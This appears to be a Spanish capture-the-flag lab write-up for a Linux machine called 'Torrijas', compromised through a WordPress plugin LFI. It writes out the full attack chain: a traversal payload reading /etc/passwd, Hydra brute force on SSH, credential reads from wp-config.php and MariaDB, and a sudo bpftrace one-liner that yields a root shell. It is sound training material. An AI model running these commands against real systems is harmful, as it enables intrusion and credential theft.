# Torrijas

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una instalación vulnerable de WordPress para obtener acceso inicial mediante SSH, realizar una correcta enumeración interna y escalar privilegios hasta conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- WordPress
- WPScan
- Local File Inclusion (LFI)
- Hydra
- SSH
- MariaDB
- GTFOBins
- bpftrace

---

## 🧠 Metodología

Tras realizar la enumeración inicial, observé que la máquina exponía tres servicios: **SSH**, **HTTP** y **MariaDB**. Aunque la base de datos podía parecer un objetivo interesante, no disponía de credenciales para acceder a ella, por lo que decidí centrar la atención en la aplicación web.

La página no mostraba información útil a simple vista, así que profundicé mediante técnicas de enumeración web hasta identificar que se trataba de una instalación de **WordPress**. En lugar de insistir únicamente con ataques de fuerza bruta sobre el panel de administración, decidí investigar los plugins instalados buscando posibles vulnerabilidades conocidas.

Al encontrar un plugin vulnerable a **Local File Inclusion (LFI)**, cambié completamente el enfoque. En vez de intentar obtener acceso directamente, utilicé la vulnerabilidad para obtener información del sistema operativo, concretamente el archivo `/etc/passwd`, con el objetivo de descubrir usuarios válidos.

Una vez obtenidas las credenciales mediante fuerza bruta sobre SSH, la prioridad pasó a ser la escalada de privilegios. La enumeración clásica (`sudo -l` y búsqueda de binarios SUID) no ofreció resultados, por lo que continué investigando la instalación de WordPress. El archivo `wp-config.php` resultó ser una fuente de información crítica, ya que almacenaba las credenciales de acceso a MariaDB.

El acceso a la base de datos permitió descubrir nuevas credenciales pertenecientes a otro usuario del sistema. Finalmente, tras repetir la enumeración con este nuevo usuario, apareció un binario permitido mediante **sudo** que podía explotarse utilizando una técnica documentada en **GTFOBins**, obteniendo así acceso como **root**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé identificando la dirección IP de la máquina mediante `arp-scan` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido con `ping`.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.1.23
```

Se descubrieron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |
| 3306 | MariaDB |

---

### 2. Enumeración web

La página principal no contenía información relevante ni existían datos interesantes en el código fuente.

Realicé un fuzzing de directorios utilizando Gobuster.

```bash
gobuster dir -u http://192.168.1.23 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Gracias a esta enumeración identifiqué que el sitio utilizaba **WordPress**.

A continuación utilicé **WPScan** para realizar una enumeración de usuarios.

```bash
wpscan --url http://192.168.1.23/wordpress --enumerate u,vp
```

Se encontró el usuario **administrator**.

Intenté descubrir su contraseña mediante fuerza bruta utilizando la wordlist **rockyou**, pero no obtuve resultados.

En lugar de continuar insistiendo por esa vía, decidí enumerar todos los plugins instalados.

```bash
wpscan --url http://192.168.1.23/wordpress --enumerate ap --force --plugins-detection mixed
```

Durante esta enumeración apareció un plugin vulnerable a **CVE-2024-3673**, una vulnerabilidad de **Local File Inclusion (LFI)**.

---

### 3. Explotación del LFI

Descargué el exploit público y lo utilicé para leer el archivo `/etc/passwd`.

```bash
python3 CVE-2024-3673.py --url http://192.168.1.23/wordpress --file ../../../../../etc/passwd
```

Esto permitió identificar dos usuarios del sistema:

- `primo`
- `premo`

---

### 4. Acceso inicial

Con los usuarios obtenidos lancé un ataque de fuerza bruta contra el servicio SSH mediante Hydra.

Se obtuvieron las siguientes credenciales:

```
premo:cassandra
```

Con ellas inicié sesión mediante SSH.

```bash
ssh premo@192.168.1.23
```

Una vez dentro localicé la flag **user.txt**.

---

### 5. Enumeración interna

El primer paso fue comprobar los privilegios disponibles.

```bash
sudo -l
```

No existían permisos interesantes.

También busqué binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```

Ninguno era explotable.

Al tratarse de una máquina con WordPress instalado, decidí revisar el archivo de configuración.

```bash
cat /var/www/html/wordpress/wp-config.php
```

En él encontré las credenciales de acceso a MariaDB.

Con ellas inicié sesión.

```bash
mysql -u admin -p
```

Tras explorar las bases de datos de WordPress localicé el hash del usuario **administrator**.

Posteriormente comprobé que la misma contraseña permitía autenticarse como **root** dentro de MariaDB.

Con mayores privilegios pude seguir enumerando la base de datos hasta obtener nuevas credenciales:

```
primo:queazeshurmano
```

Con ellas inicié una nueva sesión SSH.

```bash
ssh primo@192.168.1.23
```

---

### 6. Escalada de privilegios

Al ejecutar nuevamente:

```bash
sudo -l
```

Apareció el siguiente binario permitido mediante sudo.

```
/usr/bin/bpftrace
```

Busqué este binario en **GTFOBins**, donde encontré un método para obtener una shell privilegiada.

```bash
sudo bpftrace -c /bin/bash -e 'END { exit(); }'
```

Tras ejecutar el comando obtuve acceso como **root**.

Finalmente recuperé la última flag.

```bash
cat /root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio me permitió consolidar varios conceptos importantes dentro de una metodología de pentesting.
- Enumerar usuarios y plugins utilizando **WPScan**.
- Aprovechar una vulnerabilidad **LFI** para obtener información sensible del sistema.
- Utilizar el archivo `/etc/passwd` para identificar usuarios válidos.
- Combinar Hydra con la información obtenida durante la enumeración.
- Revisar el archivo `wp-config.php` para recuperar credenciales almacenadas por WordPress.
- Navegar por bases de datos MariaDB para localizar usuarios y credenciales.
- Comprender cómo la reutilización de contraseñas puede facilitar el movimiento lateral.
- Utilizar **GTFOBins** para identificar técnicas de escalada de privilegios.
- Escalar privilegios mediante el binario **bpftrace**.
